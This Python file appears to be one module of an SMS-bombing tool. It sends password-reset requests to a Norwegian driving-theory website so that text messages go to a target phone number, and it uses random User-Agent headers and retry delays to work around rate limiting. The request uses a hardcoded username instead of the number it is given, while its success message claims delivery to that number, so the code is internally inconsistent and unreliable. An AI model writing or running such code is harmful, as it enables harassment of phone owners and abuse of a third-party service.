import os
import inspect
from fake_useragent import UserAgent

class Request:
    def __init__(self, phone_number, session):
        self.url = "https://teoritentamen.no"
        self.phone_number = phone_number
        self.session = session
        self.headers = {"User-Agent": UserAgent().random}    
        self.file_name = os.path.basename(__file__)

    async def send_sms(self):
        data = {
            "username":"45819416",
        }
        try:
            async with self.session.post(f"{self.url}/login/request_password", data=data, headers=self.headers) as response:
                if response.status != 200:
                    return False, f"Error in {self.file_name} at line {inspect.currentframe().f_lineno}: Status {response.status} probably rate limited", 60
                json_response = await response.json()
                success = json_response.get('status')
                if success:
                    return True, f"SMS sent successfully to +47{self.phone_number} from https://teoritentamen.no", None
                else:
                    return False, f"Error in {self.file_name} at line {inspect.currentframe().f_lineno}: SMS not sent", 60
             
        except Exception as e:
            return False, f"Error in {self.file_name} at line {inspect.currentframe().f_lineno}: {e}", 60